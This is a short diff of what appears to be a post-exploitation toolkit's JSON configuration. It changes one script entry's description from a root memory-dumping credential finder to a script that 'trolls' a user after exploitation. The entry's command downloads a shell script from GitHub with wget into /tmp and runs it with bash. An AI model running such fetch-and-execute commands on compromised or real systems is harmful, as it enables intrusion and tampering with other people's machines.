@@ -11,7 +11,7 @@
       "remote": "https://raw.githubusercontent.com/Eckankar/prank-script/master/prank.sh",
       "local": ["data", "src", "eckankar", "prank", "prank.sh"],
       "options": [],
-      "description": "Prank is a bash script used to find plaintext credentials in memory during post-exploitation. Must be run as root. It automates the dumping of memory and searches for Linux user credentials.",
+      "description": "Prank is a bash script used to make various random changes to the user interface, such as changing the keyboard layout or remapping commands with aliases. It is intended to troll the linux user after successful exploitation.",
       "commands": [
         "/bin/sh", "-c", "\"wget -O /tmp/prank.sh https://raw.githubusercontent.com/Eckankar/prank-script/master/prank.sh; /bin/bash /tmp/prank.sh;\""
       ]
